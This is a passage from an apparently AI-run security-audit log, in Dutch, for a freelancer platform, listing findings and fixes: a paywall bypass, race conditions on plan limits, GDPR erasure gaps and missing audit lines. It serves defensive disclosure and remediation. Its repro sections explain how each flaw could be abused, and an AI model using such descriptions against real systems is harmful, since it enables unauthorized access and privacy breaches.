  notificatietitels binnen dezelfde transactie (gescopet op `type in (IDEA_STATUS, IDEA_COMMENT)` + de exacte
  titel-strings; over-redactie bij een toevallige titel-collisie wist méér PII, nooit minder). +1 erasure-regressietest
  (rood→groen) + 2 unit-tests op de builders.

### GEPARKEERD — bij de mens (FG/juridisch, geen agent-beslissing): `Review.comment` op de SUBJECT-zijde overleeft de erasure van de beoordeelde

- **Repro:** `anonymizeUser` (`admin/gebruikers/actions.ts`) redact `Review.comment` alleen voor `where: { authorId: userId }`,
  niet voor `where: { subjectId: userId }`. Een beoordeling _over_ de verwijderde persoon (door een ander geschreven)
  blijft leesbaar. Reeds als bewust openstaand item gedocumenteerd (zie onder, ronde met de reputatie-/vertrouwen-afweging):
  bewaren voor de integriteit van het reputatiesysteem vs. wissen omdat het gegevens "betreffende" de betrokkene zijn.
- **Waarom geparkeerd:** dit is een retentie-vs-erasure-afweging met een wettelijke grondslag-dimensie (gerechtvaardigd
  belang reputatiesysteem vs. art. 17) — precies het soort besluit dat MENSENWERK.md §5 expliciet bij de mens (FG) legt
  en dat een agent niet unilateraal mag oplossen. Aanbeveling: laat de FG de keuze maken + documenteren.

## Ronde 2026-08-10 (basis: `main` @ 5ec16e60)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken, plus de
delta sinds de vorige ronde (`de0a2f39..5ec16e60`, #1036–#1040 — reactie-plan-limiet-TOCTOU/`Idea.declineReason`-erasure,
run-all per-taak-timeout, franchiser dashboard-seal, roster-badge orderBy, urencriterium-voortgang). Gedekt:
(1) **cross-tenant isolatie** — `tenancy.ts`, alle `franchise/**`-actions + pages, `kandidaten/**`, `admin/franchises/**`,
`pending-tasks.ts` (`franchiserTasks`), `signals.ts` (FRANCHISER-branch), `data/roster-expiry.ts` (IDOR over tenants,
ontbrekende tenant-filters, mass-assignment van `tenantId`); (2) **document-/API-oppervlak** — alle `/api/**`-routes
(documents/media/pdf/dossier/facturen/backups/health/metrics/tasks/push/csp-report/client-error/readiness),
`documenten/**` + `certificaten/**`, `storage.ts`-consumers, upload-validatie (magic-byte-sniff + malware-scan),
cron/metrics-auth (`timingSafeEqual`), CSV-formule-injectie, foutlek; (3) **fiscaal/entitlement/PII-oppervlak** —
`ontzorgd/**` (uren + aangifte), `lib/tax/**`, `entitlement-guard.ts`, `inzicht`/`prognose`/`prestaties`,
`account-export.ts`-vs-erasure-symmetrie, k-anonimiteit. Onafhankelijk statisch geprobed: injectie (`$queryRaw` alleen
getagde `SELECT 1`), XSS (`dangerouslySetInnerHTML` alleen het genonced theme-script), SSRF/open-redirect (geen
user-gestuurde server-fetch/redirect), PII in logs, `berichten`/`facturen`/`import`/`search`-mutatieketens.
`npm audit --omit=dev` = **0**.

**Resultaat: één HOOG entitlement/paywall-bypass OPGELOST (rood→groen) + één LAAG defense-in-depth-gat gedicht in
dezelfde file. Cross-tenant- en document-/API-oppervlak schoon (geen nieuw KRITIEK/HOOG toegangs-, IDOR-, injectie-
of PII-lek). Eén LAAG dedup-race uit de vorige ronde blijft geparkeerd.**

### OPGELOST — HOOG (OWASP A01 Broken Access Control + AVG-grondslag, CLAUDE.md regel 1): aangifte-entitlement negeerde `currentPeriodEnd` (paywall-bypass + PII naar verwerker)

- **Repro (was):** `startFiling` (`ontzorgd/aangifte/actions.ts`) en de `AangiftePage`-loader bepaalden het plan met een
  lokale `sub?.status === "ACTIVE" ? sub.plan.key : "FREE"` — precies het patroon dat `entitlement-guard.ts` had moeten
  consolideren — en negeerden `currentPeriodEnd`. Een `Subscription` blijft `ACTIVE` in de DB tot de dagelijkse
  `subscription-expiry-task` (via `/api/tasks/run-all`) hem naar CANCELLED veegt. In dat venster (betaalde periode al
  verlopen, sweep nog niet gedraaid) weigerde `/ontzorgd/uren` correct (canonieke `userHasEntitlement` → FREE), maar
  `/ontzorgd/aangifte` toonde nog de "Volledig Ontzorgd"-UI **en** `startFiling()` slaagde nog: het maakte een echte
  `TaxFilingRequest`, draaide `buildDossier` en riep de EXTERNE tax-partner (`prepareConcept()`) aan — dus fiscale PII
  ging de grens over naar de verwerker — voor een ZZP'er wiens entitlement feitelijk verlopen was. Monetisatie-bypass
  én AVG-grondslagprobleem.
- **Geschonden regel:** CLAUDE.md regel 1 (server-side waarheid / één bron van entitlement); OWASP A01:2021; AVG
  (grondslag/dataminimalisatie — PII naar een verwerker zonder geldige grondslag).
- **Fix (deze PR):** `startFiling` en de pagina gebruiken nu de canonieke `userHasEntitlement(actor.id,
"VOLLEDIG_ONTZORGD")` uit `entitlement-guard.ts` (→ `isSubscriptionActive`, telt een ACTIVE-rij met verlopen periode
  als FREE). Lokale `planKeyFor` verwijderd. +2 unit-tests (rood→groen): een ACTIVE-maar-verlopen sub wordt geweigerd
  zonder partner-effect/upsert/audit; een geldige (toekomstige) periode gaat wél door.

### OPGELOST — LAAG (defense-in-depth, CLAUDE.md regel 2): `approveAndSubmit`/`revokeFiling` misten de expliciete rolcheck

- **Repro (was):** beide functies deden `requireActor()` → ownership → actie → audit, maar zonder de expliciete
  rolcheck die `startFiling`/`deleteIndirectHours` wél doen. Niet direct exploiteerbaar (`TaxFilingRequest.userId`
  wordt alleen door het rol-/entitlement-gated `startFiling` gezet), maar het brak de gemandateerde keten en zou een
  gat worden als rollen ooit muteerbaar worden of een rij langs een ander pad ontstaat.
- **Fix (deze PR):** `if (actor.role !== "FREELANCER") throw new AuthorizationError(...)` toegevoegd aan beide functies
  (pariteit met `deleteIndirectHours`).

## Ronde 2026-08-10 (lokale livegang-gereedheidssessie, basis: `main` @ 5ec16e60)

Volledige lokale gate gedraaid (typecheck, lint, 5636 unit-tests, build, prettier, check:env,
scan-secrets, `npm audit --omit=dev` = **0**) en de drie technisch-geparkeerde LAAG-items uit de
ronden 2026-08-02/02b opgelost volgens hun eigen aanbevolen fix (zie de secties hieronder, in situ
bijgewerkt):

1. **Same-day dedup race no-show/credential-reminder (LAAG → OPGELOST):** `reportNoShow` en
   `sendCredentialReminder` draaien hun idempotentie-check + write(s) nu in één interactieve
   `prisma.$transaction` onder **`TransactionIsolationLevel.Serializable` met begrensde
   P2034-retry** (spiegel van `applications-create.ts`/`opdrachten/actions.ts`) — onder de
   Postgres-default READ COMMITTED zou een gewone interactieve transactie de race niet sluiten.
   Bij `reportNoShow` vallen create + notificatie + audit bovendien in dezelfde atomaire
   transactie (geen ongeaudite report bij een fout ná de create). +5 no-show-tests (dedup,
   atomair, P2034-retry beide uitkomsten, non-P2034-propagatie), +3 reminder-tests (Serializable-
   assertie, P2034-retry zonder dubbele send, non-P2034-propagatie).
2. **Re-voorstel-reset vs. canonieke overgangsmap (LAAG → OPGELOST, optie B):** kruisverwijzing-
   comment op `COLLABORATION_TRANSITIONS.CANCELLED` (collaborations.ts) + vangrail-test die borgt
   dat `CANCELLED→PROPOSED` bewust afwezig blijft (her-voorstel loopt uitsluitend via de
   `REPROPOSABLE_CANCELLED_WHERE`-guard).
3. **`saveApplicationNote` niet-atomaire audit (LAAG → OPGELOST):** update + auditregel in één
   `prisma.$transaction` (CLAUDE.md regel 5).

De KRITIEK/HOOG/LAAG-items die op een FG-/juridische beslissing geparkeerd staan (derden-PII bij
anonimisering, `kvkNumber` publiek profiel, retentie-beleidskeuzes) zijn bewust NIET aangeraakt —
MENSENWERK.md §5.

## Ronde 2026-08-02b (basis: `main` @ de0a2f39)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken, plus de
delta sinds de vorige ronde (`999e46a7..de0a2f39`, #1028–#1035 — no-show-erasure, retentie-gauges, publishJob
TOCTOU/plan-limiet, document-substitutie-TOCTOU, losse-factuur status/dispuut/regelplafond-gates, badge-drift).
Gedekt: (1) de geld-/opdracht-mutatieketen (`opdrachten`/`samenwerkingen`/`facturen`/`applications-create`/
`shift-handoff`/`no-show`/`pending-tasks` — auth→rol→ownership→Zod→actie→audit, IDOR, mass-assignment, TOCTOU op
publish/factureer/status); (2) document-/verificatie-oppervlak (`storage.ts`, `certificaten`, alle document-/PDF-/
dossier-routes, verificatiequeue, `CREDENTIAL_TRANSITIONS`); (3) erasure-vs-export-volledigheid (AVG art. 15/17/20 —
élk PII-veld uit `account-export.ts` één-op-één tegen `anonymizeUser`), cross-tenant isolatie (`tenancy.ts` +
`franchise/**`), injectie/XSS/CSV/SSRF/open-redirect/headers/foutlek en alle niet-document `/api`-routes
(cron-Bearer + `timingSafeEqual`, webhook re-fetch, push-endpoint-allowlist). `npm audit --omit=dev` = **0** (2 dev-only
DoS-advisories in de eslint/js-yaml-toolchain, niet-runtime).

**Resultaat: twee MIDDEL-gaten OPGELOST (rood→groen). (1) reactie-plan-limiet TOCTOU (monetisatie-bypass, OWASP A04);
(2) `Idea.declineReason` export/erasure-asymmetrie (AVG art. 15/17). Geen nieuw KRITIEK/HOOG toegangs-, injectie- of
cross-tenant-gat gevonden; document-/verificatie-oppervlak schoon. Eén LAAG dedup-race geparkeerd.**

### OPGELOST — MIDDEL (OWASP A04 Insecure Design, CLAUDE.md regel 1/2): reactie-plan-limiet was TOCTOU-baar (monetisatie-bypass)

- **Repro (was):** `createApplicationForJob` (`src/lib/applications-create.ts`) telde de bestaande reacties met een
  losse `prisma.application.count(...)` en deed daarna — buiten een transactie — de `create`. Twee gelijktijdige
  reacties van dezelfde FREE-ZZP'er (op verschillende opdrachten, parallel afgevuurd) lazen beide dezelfde `count`,
  passeerden beide `canApply`, en creëerden beide → de plan-limiet werd met N overschreden (N = aantal parallelle
  requests, client-stuurbaar). Puur monetisatie-/plan-integriteit (geen PII-lek), vandaar MIDDEL. Exact dezelfde
  race-klasse die #1032/#1033 al dichtte voor `changeJobStatus` (job-publish) — asymmetrie.
- **Geschonden regel:** CLAUDE.md regel 1 (server-side waarheid) / regel 2 (atomaire mutatieketen); OWASP A04.
- **Fix (deze PR):** pre-transactionele lees blijft als fast-fail (bespaart de dure matchscore-berekening); de
  echte grendel is nu een her-telling BÍNNEN een `Serializable` transactie mét de insert + retry-on-P2034
  (`APPLICATION_TX_OPTIONS`/`APPLICATION_MAX_ATTEMPTS`) — spiegelt `JOB_PUBLISH_TX_OPTIONS`/`changeJobStatus`. Op
  Postgres SSI conflicteert telling+insert met een gelijktijdige tweede reactie → P2034 → her-telling ziet de
  gecommitte reactie en weigert. +2 unit-tests (rood→groen): een reactie die de pre-check passeert maar in het
  venster het maximum bereikt, wordt in de transactie geweigerd (geen create/audit/notificatie).

### OPGELOST — MIDDEL (AVG art. 15/17, CLAUDE.md regel 4): `Idea.declineReason` zat in de AVG-export maar overleefde de erasure

- **Repro (was):** `account-export.ts` geeft `Idea.declineReason` prijs als eigen inzage-data (art. 15/20), maar
  `anonymizeUser` (`admin/gebruikers/actions.ts`) redigeerde alleen `title`/`description` van het eigen idee, niet
  `declineReason`. Na een art. 17-verzoek bleef de door de admin geschreven weigerreden leesbaar in de DB; een tweede
  kopie stond in de `IDEA_STATUS_SET`-auditmetadata (`{ reason }`), die de generieke `scrubAuditMetadataPii` (exacte
  e-mail/naam-match) niet raakt. Export-vs-erasure-asymmetrie — zelfde klasse als de eerder gedichte
  `Expense.description`/`NoShowReport.reason`-gaten.
- **Geschonden regel:** AVG art. 15/17 (onvolledige erasure) + CLAUDE.md regel 4; interne inconsistentie met het
  bestaande `disputeReason`-drie-kopie-erasurepatroon.
- **Fix (deze PR):** `Idea.declineReason` → null op de eigen ideeën binnen de erasure-transactie + de
  `IDEA_STATUS_SET`-auditmetadata-reason geredigeerd voor die ideeën (spiegelt de `disputeReason`-auditscrub). +test
  (rood→groen).

### OPGELOST (10-8-2026, lokale sessie) — LAAG (correctheid/hygiëne, geen toegangsgat): same-day dedup in no-show / credential-reminder niet race-guarded

- **Repro:** `reportNoShow` (`samenwerkingen/no-show-actions.ts:74-89`) en `sendCredentialReminder`
  (`samenwerkingen/actions.ts:556-597`) doen een `findFirst`/`findMany`-idempotentiecheck en daarna een losse
  `create`, buiten een transactie. Een racende dubbel-submit binnen hetzelfde venster kan twee `NoShowReport`-rijen /
  twee `CREDENTIAL_REMINDER_SENT`-notificaties voor dezelfde dag opleveren vóór de eerste write zichtbaar is. Geen
  autorisatie-/PII-gat; rate-limiters begrenzen de blast-radius.
- **Geschonden regel:** CLAUDE.md regel 5 (idempotentie/atomiciteit). Geen toegangsgat.
- **Aanbevolen fix:** read+write in één `prisma.$transaction` met een unique-constraint of compound-guard, zoals
  `shift-handoff-actions.ts:94-108` al doet.
- **Fix (10-8-2026):** beide actions serialiseren check + write(s) in één interactieve
  `prisma.$transaction` onder `Serializable`-isolatie met begrensde P2034-retry (spiegel van
  `applications-create.ts` — een gewone interactieve transactie sluit de race onder Postgres
  READ COMMITTED níet). `reportNoShow` neemt ook notificatie + audit in dezelfde atomaire
  transactie mee. Tests: `no-show-oracle.test.ts` (+5) en `credential-reminder.test.ts` (+3).

## Ronde 2026-08-02 (basis: `main` @ 999e46a7)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende oppervlakken, plus de
delta sinds de vorige ronde (`a825bd86..999e46a7`, #1024–#1027 — herbruikbaar-geannuleerd-voorstel-flow, franchise
badge-signaal, webhook-retentie-gauge; grotendeels pure/geteste logica). Gedekt: (1) de delta-mutatieketen
(`kandidaten`/`samenwerkingen`/`reacties`/`collaboration-reproposal`/`accepted-proposal`/`pending-tasks` — auth→rol→
ownership→Zod→actie→audit, IDOR, mass-assignment, TOCTOU op de re-voorstel-reset); (2) het observability-/metrics-
endpoint (`/api/metrics`, `/api/health`) + cross-tenant isolatie (`tenancy.ts` + `franchise/**`); (3) export-vs-erasure
volledigheid (AVG art. 15/17/20) — élk PII-/vrije-tekstveld uit `account-export.ts` één-op-één vergeleken met
`anonymizeUser`. `npm audit --omit=dev` = **0**.

**Resultaat: één nieuw HOOG erasure-gat OPGELOST (rood→groen). Geen nieuw KRITIEK/HOOG toegangs-, injectie- of
cross-tenant-gat; het metrics-endpoint is fail-closed (Bearer + `timingSafeEqual`, geen PII/labels). Twee LAAG
audit-/architectuur-consistentiepunten geparkeerd.**

### OPGELOST — HOOG (AVG art. 17, CLAUDE.md regel 4/5): `NoShowReport.reason` overleefde de erasure van de MÉLDER én lekte verbatim naar de feed van de gemelde ZZP'er

- **Repro (was):** `NoShowReport.reason` is vrije tekst die de melder (opdrachtgever/franchiser) zelf typt
  (`reportNoShow`, `samenwerkingen/no-show-actions.ts`). De AVG-data-export (`account-export.ts:390`, `reportedById ==
actorId`) geeft 'm expliciet prijs als de **eigen PII van de melder** onder art. 15/20. Maar `anonymizeUser`
  (`admin/gebruikers/actions.ts`) bevatte géén `noShowReport.updateMany` → na een art. 17-verzoek van de melder bleef
  de vrije tekst leesbaar in de DB. Tweede kopie: `reportNoShow` zet dezelfde reden verbatim in de body van de
  `NO_SHOW_REPORTED`-notificatie op de feed van de gemélde ZZP'er (`Reden: <reden>`) — die notificatie-redactie in
  `anonymizeUser` was gescoopt op `userId == de betrokkene` en raakte een notificatie in _andermans_ inbox nooit. De
  reden bleef dus permanent zichtbaar bij een derde. De oude `bewust niet hier`-comment klopte alleen voor de erasure
  van de gemélde ZZP'er (reden door een ánder geschreven), niet voor de melder-auteur.
- **Geschonden regel:** AVG art. 17 (onvolledige erasure) + CLAUDE.md regel 4/5; interne inconsistentie met het
  reeds bestaande DISPUTE_OPENED/INVOICE_CREDITED drie-kopie-patroon. Zelfde klasse als de eerder gedichte
  `Expense.description`-asymmetrie (#1016), maar met derde-partij-lek.
- **Fix (deze PR):** (1) redact `NoShowReport.reason` op de eigen meldingen; (2) reconstrueer de exacte
  notificatiebody via de nieuwe gedeelde pure functie `noShowReportedNotificationBody` (`src/lib/no-show.ts`, gebruikt
  door zówel `reportNoShow` als `anonymizeUser` → geen drift) en redact precies díe notificatie op de ZZP'er-feed.
  Comments in `actions.ts` gecorrigeerd. +2 unit-tests (rood→groen). **Mens (MENSENWERK.md §5):** reden kan art. 9
  (gezondheid) bevatten — bevestig bewaargrond/retentie.

### OPGELOST (10-8-2026, lokale sessie) — LAAG (CLAUDE.md regel 3, OWASP A04): re-voorstel-reset omzeilt de canonieke overgangsmap

- **Repro:** `proposeCollaboration` (`samenwerkingen/actions.ts:91-116`, `existing`-tak) reset een `CANCELLED`
  samenwerking terug naar `PROPOSED` via een compound-guarded `updateMany` op `REPROPOSABLE_CANCELLED_WHERE` —
  maar roept `assertCollaborationTransition` niet aan; in de canonieke map (`collaborations.ts`) is `CANCELLED: []`
  terminaal. **Niet exploiteerbaar** (de where-guard is strikter: nooit-getekend, geen facturen/prestaties, TOCTOU-
  dicht), maar de overgangsautoriteit staat nu op twee losse plekken → risico op stille drift bij een toekomstige
  edit.
- **Geschonden regel:** CLAUDE.md regel 3 ("statusovergangen via expliciete map"). Geen toegangsgat.
- **Aanbevolen fix:** centraliseer de uitzondering als een expliciete voorwaardelijke overgang in `collaborations.ts`
  (`assertCollaborationReproposalTransition`) die `proposeCollaboration` aanroept, óf een kruisverwijzing-comment +
  een unit-test die borgt dat `CANCELLED→PROPOSED` bewust afwezig blijft in `COLLABORATION_TRANSITIONS`.
- **Fix (10-8-2026, optie B):** kruisverwijzing-comment op de `CANCELLED: []`-entry in
  `collaborations.ts` (verwijst naar `REPROPOSABLE_CANCELLED_WHERE` als enige uitzonderingspad) +
  vangrail-test in `collaborations.test.ts` dat `CANCELLED→PROPOSED` afwezig blijft in de map.

### OPGELOST (10-8-2026, lokale sessie) — LAAG (CLAUDE.md regel 5, atomiciteit): `saveApplicationNote` schrijft de audit niet-atomair met de mutatie

- **Repro:** `saveApplicationNote` (`kandidaten/actions.ts:157-163`) doet `prisma.application.update(...)` en de
  daaropvolgende `audit(...)` als twee losse statements, niet in één `$transaction` zoals de rest van de mutaties in
  dit bestand. Faalt de audit-write ná de geslaagde update (transiënte DB-fout), dan is de notitiewijziging stil
  ongeaudit. **Laag** (een vrije-tekstnotitie is geen verificatie-/status-/document-toegang-event), maar wijkt af van
  het atomiciteitspatroon elders.
- **Geschonden regel:** CLAUDE.md regel 5 (audit alles wat telt — atomair). Geen toegangsgat.
- **Aanbevolen fix:** `await prisma.$transaction([prisma.application.update(...), prisma.auditLog.create({ data: auditData(...) })])`.
- **Fix (10-8-2026):** exact zo uitgevoerd in `kandidaten/actions.ts` (update + audit atomair).

## Ronde 2026-08-01b (basis: `main` @ a825bd86)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende hoog-risico
oppervlakken, plus de delta sinds de vorige ronde (`705b40f1..a825bd86`, #1016–#1022 — grotendeels pure,
geteste logica: `candidate-experience.ts`/`candidate-track-records.ts` (kandidaat-ervaringssignaal), TOCTOU-
guards op prestatie-correctie/betaalherinnering/modelovereenkomst-vorm, deterministische admin-wachtrij-
ordering, back-up-integriteitsverificatie — geen nieuw route- of mutatie-oppervlak). Gedekt: (1) cross-tenant
isolatie over `tenancy.ts` + de volledige `src/lib/franchise/**`-set + alle `src/app/(protected)/franchise/**`-
loaders/-acties (elke `findUnique`/`update`/`delete`/`groupBy` gescoopt op `tenantId` via `ownsViaTenant`/
`tenantScopeWhere`; `currentActor()` leest rol/tenant/status vers uit de DB, niet uit de JWT; geschorste tenant
fail-closed); (2) PII-over-fetch/dataminimalisatie (AVG art. 5(1)(c)) over kandidaten/freelancers/zzp-profiel/
publieke vertrouwens-share-link/opdrachten/reacties/berichten + alle `src/lib/data/*`-loaders — elke `select`
regel-voor-regel vergeleken met de gerenderde UI; geen veld dat als ongebruikte prop een `"use client"`-grens
bereikt, geen privé-veld van partij A in de view van partij B, k-anonimiteit (`MARKET_RATE_MIN_SAMPLE=10`)
correct toegepast; (3) injectie/output-encoding/SSRF/open-redirect/headers/foutlek — enige
`dangerouslySetInnerHTML` = het nonce'd theme-script, alle CSV-exports via `escapeCsvField` (CWE-1236),
`$queryRaw` enkel `SELECT 1`, geocoding/routing host hardcoded (place-string enkel query-param, geen SSRF),
push-endpoints via host-allowlist, redirects server-geconstrueerd, CSP nonce + `strict-dynamic` + `frame-
ancestors 'none'`, HSTS/COOP/CORP gezet, foutgrenzen tonen enkel `error.digest`. OWASP A01/A03/A05/A07/A10 +
AVG art. 5/15/17 als leidraad.

**Resultaat: geen nieuw KRITIEK/HOOG/MIDDEL toegangs-, injectie-, cross-tenant- of PII-gat. De sinds
2026-08-01 geparkeerde LAAG audit-trail-consistentie (`deleteWorkExperience` schreef geen `*_DENIED` op een
cross-owner-poging) is deze ronde OPGELOST (rood→groen).**

### OPGELOST — LAAG (CLAUDE.md regel 5 "Audit alles wat telt", CWE-778): `deleteWorkExperience` schrijft nu een `WORK_EXPERIENCE_DELETE_DENIED`-auditregel op een geweigerde cross-owner-poging

- **Repro (was):** `src/app/(protected)/profiel/actions.ts` — `deleteWorkExperience` dwong ownership correct af
  (`existing.freelancerProfileId !== profile.id` → geen verwijdering, geen bestaans-orakel), maar retourneerde op
  de geweigerde cross-owner-poging (of een onbekend id) stil `{ ok: true }` **zonder auditregel**. De zusterguard
  `deleteDocument` schrijft in exact dat geval wél een `DOCUMENT_DELETE_DENIED`-regel (zodat IDOR-enumeratie op
  document-id's zichtbaar wordt in de trail). Niet exploiteerbaar (geen lek, geen mutatie, respons identiek aan
  "al weg"), maar inconsistent met de vastgelegde audit-trail-policy — een IDOR-enumeratiepoging op werkervaring-
  id's bleef onzichtbaar.
- **Geschonden regel:** CLAUDE.md regel 5 (audit alles wat telt — ontbrekende trail op een geweigerde toegang);
  CWE-778 (Insufficient Logging). Geen OWASP-toegangsgat.
- **Fix (deze PR):** in de `!existing || vreemd profiel`-tak wordt nu een `audit({ action:
"WORK_EXPERIENCE_DELETE_DENIED", entityType: "WorkExperience", entityId: id })`-regel geschreven vóór de stille
  `{ ok: true }` — exacte spiegel van `deleteDocument`. Het gegokte id komt in de trail. Nieuwe audit-label
  `WORK_EXPERIENCE_DELETE_DENIED` ("Verwijdering werkervaring geweigerd") in `src/lib/audit-labels.ts`. +3 unit-
  tests (`work-experience-delete-denied.test.ts`, rood→groen: zonder de audit-op-weigering faalt de assertie op
  vreemd-profiel én onbekend-id; de eigen-verwijdering-happy-path schrijft géén DENIED).

## Ronde 2026-08-01 (basis: `main` @ 705b40f1)

Audit: orchestrator (Opus 4.8) + 3 parallelle adversariële Opus-audits op niet-overlappende hoog-risico
oppervlakken (naast de delta sinds de vorige ronde, `d89f405d..705b40f1`, #1011–#1015 — routine-escalatie/
roster-capaciteitslogica + de fail-closed `Tenant.status`-poort; puur/getest, geen nieuw route- of
mutatie-oppervlak). Gedekt: (1) de volledige NIET-franchise server-action- en route-handler-mutatieketen
(auth→rol→ownership→Zod→actie→audit) over credentials/verificatie/profiel/opdrachten/reacties/berichten/
facturen/**tweezijdige beoordelingen (double-blind reveal)**/samenwerkingen/no-show/shift-handoff/account/
admin (12 admin-actiebestanden) + de cron-taakroutes; (2) cross-tenant isolatie over `tenancy.ts` + de
volledige `src/lib/franchise/**`-set + alle `src/app/(protected)/franchise/**`-loaders/-acties, met nadruk op
de nieuwste modules (`roster-capacity.ts`, `roster-unavailability.ts`, `roster-double-booking.ts`,
`dienst-fill-signal.ts`, `roster-dossier.ts`); (3) AVG-anonimisering/erasure-volledigheid, exports (art. 15/20),
dataminimalisatie/over-fetch, k-anonimiteit, PII-in-logs, injectie (`$queryRaw`/XSS/CSV-formule/SSRF/open-
redirect), secrets, security-headers/CSP, retentie-sweeps. Orchestrator-scans los: `npm audit --omit=dev` = **0**
(3 advisories zijn dev-only, o.a. js-yaml — niet in de productie-bundle); double-blind review-reveal volledig
server-afgeleid (richting/subject/reveal nooit uit client-input, PENDING_REVEAL nooit vóór reveal geëxporteerd);
cron-routes Bearer + `timingSafeEqual` + 503-zonder-secret. OWASP A01/A03/A05/A07 + AVG art. 5/15/17/20 als leidraad.

**Resultaat: geen nieuw KRITIEK/HOOG toegangs-, injectie- of cross-tenant-gat. Eén erasure-completeness-
asymmetrie OPGELOST (rood→groen); één LAAG audit-trail-consistentie geparkeerd.**

### OPGELOST — MIDDEL (AVG art. 17, CLAUDE.md regel 4/5): `Expense.description` overleefde de anonimisering terwijl de data-export 'm als PII prijsgeeft

- **Repro (was):** `anonymizeUser` (`src/app/(protected)/admin/gebruikers/actions.ts`) redact élk vergelijkbaar
  zelf-getypt vrije-tekstveld op een fiscaal-bewaarde rij (`Performance.description`, `IndirectHoursEntry.note`,
  `AvailabilityWindow.note`, credit-`Invoice.rejectionReason`) — maar liet **`Expense.description`** ongemoeid.
  Dat veld is zelf-getypte vrije tekst die de ZZP'er bij een aftrekbare uitgave schreef (kan opdrachtgever/
  locatie/persoon benoemen). De AVG-data-export (`src/lib/account-export.ts:330-343`) exporteert het veld
  **expliciet als eigen PII onder art. 15/20** ("Omschrijving is eigen vrije tekst"). Na een art. 17-verzoek bleef
  die vrije-tekst-PII dus leesbaar in de DB — een echte, live asymmetrie tussen de inzage- en de wis-route.
- **Geschonden regel:** AVG art. 17 (onvolledige erasure) + CLAUDE.md regel 4/5 (verwijderen wat telt; de
  platform-eigen policy — vrije tekst op een fiscaal-bewaarde rij → redacten, rij behouden — werd hier niet
  consequent toegepast). Geen OWASP-toegangsgat; privacy-completeness.
- **Fix (deze PR):** `prisma.expense.updateMany({ where: { userId }, data: { description: "[Verwijderd op
verzoek van de gebruiker]" } })` toegevoegd aan de anonimiseringstransactie, náást de `Performance`-redactie.
  De Expense-rij zelf blijft staan (fiscale bewaargrond: bedrag/btw/datum/categorie), alleen de non-nullable
  vrije tekst wordt geneutraliseerd — exact het spiegelbeeld van de inzage-export. +1 unit-test
  (`anonymize-erasure.test.ts`, rood→groen: zonder de `updateMany` is `find("expense.updateMany")` undefined).
  Dit vervangt de eerdere "FG-oordeel, redact-vs-retain"-parkering (PROGRESS.md): de retain-grond geldt voor de
  rij, niet voor de zelf-geschreven vrije tekst, en het platform maakt die keuze al voor `Performance.description`.

### GEPARKEERD — LAAG (CLAUDE.md regel 5, "Audit alles wat telt"): `deleteWorkExperience` schrijft geen `*_DENIED`-auditregel op een cross-owner-poging

- **Repro:** `src/app/(protected)/profiel/actions.ts:218-222` — `deleteWorkExperience` dwingt ownership correct af
  (`existing.freelancerProfileId !== profile.id` → geen verwijdering, geen bestaans-orakel), maar retourneert op de
  geweigerde cross-owner-poging stil `{ ok: true }` **zonder auditregel**. Elke zusterguard (`deleteDocument`,
  `cancelShiftHandoff`, `deleteExpense`, support `loadOwnedTicket`) schrijft in dat geval wél een `*_DENIED`/
  `*_ACCESS_DENIED`-regel. **Niet exploiteerbaar** (geen lek, geen mutatie, respons identiek aan "al weg"), maar
  inconsistent met de vastgelegde audit-trail-policy.
- **Geschonden regel:** CLAUDE.md regel 5 (audit alles wat telt — hier: ontbrekende trail op een geweigerde
  toegang). CWE-778 (Insufficient Logging).
- **Aanbevolen fix:** schrijf een `WORK_EXPERIENCE_DELETE_DENIED`-auditregel (actorId, entityId = het gegokte id)
  in de `existing == null || vreemd profiel`-tak, spiegel van `deleteDocument`. +1 unit-test.

## Ronde 2026-07-31b (basis: `main` @ d89f405d)

Audit: orchestrator (Opus 4.8) + 4 parallelle adversariële Opus-audits op niet-overlappende hoog-risico
oppervlakken. Gedekt: (1) BOLA/IDOR + path-traversal + token-timing + foutlek op álle dynamische
resource-serving route-handlers (documents/media/facturen/prestaties/admin-facturatie/dossier/dba-dossier/
modelovereenkomst/agenda-feed); (2) cross-tenant isolatie over de volledige franchise-server-action- en
loader-set (`tenancy.ts` + 43 `src/lib/franchise/*`-bestanden + 6 `"use server"`-acties + roster-dossier
PII-loader); (3) de volledige NIET-franchise server-action-mutatieketen (auth→rol→ownership→Zod→actie→audit)
over credentials/verificatie/profiel/opdrachten/reacties/berichten/facturen/samenwerkingen/account/admin/
abonnement; (4) AVG-anonimisering/erasure-volledigheid, exports (art. 15/20), dataminimalisatie/over-fetch,
k-anonimiteit, PII-in-logs, de nieuwe berichten-retentie-sweep. Orchestrator-scans los: `npm audit --omit=dev`
= **0**; geen `$queryRaw` met user-input (enkel `SELECT 1`-healthpings); enige `dangerouslySetInnerHTML` =
het nonce'd theme-script; CSP strikt (nonce + `strict-dynamic` in prod); geen SSRF (geen server-side fetch met
user-URL); betaal-webhook (rate-limit + body-cap + handtekening + idempotent + audit); wachtwoord-reset-token
(256-bit, sha256-at-rest, 1u-TTL, atomair eenmalig gebruik, `passwordChangedAt`-bump invalidatie); geen secrets
in code/git; `.env` niet getrackt, `/storage` gitignore'd. OWASP A01/A03/A05/A07 + AVG art. 5/15/17/20 als leidraad.

**Resultaat: geen nieuw KRITIEK/HOOG toegangs-, injectie- of privacy-gat. Eén latente autorisatie-
completeness-bevinding (dead schema `Tenant.status`) OPGELOST (fail-closed, zero-live-impact, rood→groen).**

### OPGELOST — LAAG→MIDDEL (OWASP A01, CLAUDE.md tenant-isolatie): `Tenant.status` was dead schema — een geschorste franchise werd nergens afgedwongen

- **Repro (was):** `Tenant.status` (`ACTIVE | SUSPENDED`, `prisma/schema.prisma:93`) bestond in het schema —
  met een comment die impliceert dat de platform-admin een franchise kan schorsen — maar werd **nergens gelezen**
  (`grep -rn` over de hele repo: 0 reads, 0 writes weg van de default). Alleen `User.status`/`anonymizedAt` werden
  in `currentActor()` afgedwongen, nooit `Tenant.status`. Zou een admin (na het bouwen van een suspend-actie) een
  franchise op `SUSPENDED` zetten wegens wanbetaling/fraude/AVG-incident, dan bleven de franchiser én élke
  roster-ZZP'er/opdrachtgever die via `tenantId` aan de tenant hangt **gewoon volledig operationeel** — de
  suspend-switch was inert. Niet live exploiteerbaar (geen code zette `SUSPENDED`), maar een latent A01-gat: een
